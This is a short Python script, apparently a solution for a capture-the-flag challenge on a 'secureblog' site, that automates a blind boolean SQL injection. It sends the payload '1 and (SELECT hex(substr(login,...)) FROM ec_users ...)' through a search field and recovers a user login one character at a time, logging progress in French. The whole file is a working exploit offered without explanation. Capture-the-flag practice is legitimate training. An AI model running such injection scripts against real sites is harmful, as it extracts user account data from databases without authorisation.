#!/usr/bin/env python3

import pwn
import string
import requests

table_name = ""
alphabet = string.printable  # [:-6]
url = "https://secureblog.challenge.operation-kernel.fr/v2/post.php"
seek = True
pwn.log.progress("Can i found it ?")
while seek:
    loop = 0
    for car in alphabet:
        req = {
            "search": "1 and (SELECT hex(substr(login,{},1)) FROM ec_users limit 1 offset 2) = hex('{}')".format(
                len(table_name) + 1, car
            )
        }

        x = requests.post(url, data=req)
        response = x.url[51:]

        r = requests.post(url + "&id=" + response)
        # print("loop {} sur {} caractères".format(loop,str(len(alphabet))))
        if str("bob") in r.text:
            table_name += car
            pwn.warn(
                "Le caractère {} est le bon, il est ajouté à data_leak : {}".format(
                    car, table_name
                )
            )
            x.close()
            loop += 1
            break
        loop += 1
        x.close()
        if loop == len(string.printable):
            pwn.success("L'information leakée est : {}".format(table_name))
            seek = False
        else:
            continue
